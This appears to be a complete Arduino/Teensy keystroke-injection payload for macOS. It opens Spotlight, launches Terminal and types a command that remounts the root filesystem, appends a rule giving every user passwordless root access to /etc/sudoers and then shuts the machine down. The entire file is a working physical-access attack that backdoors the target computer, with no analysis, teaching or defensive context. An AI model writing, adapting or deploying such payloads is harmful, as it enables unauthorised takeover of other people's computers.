#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("terminal");
  delay(3000);
  Keyboard.println("mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now");
}
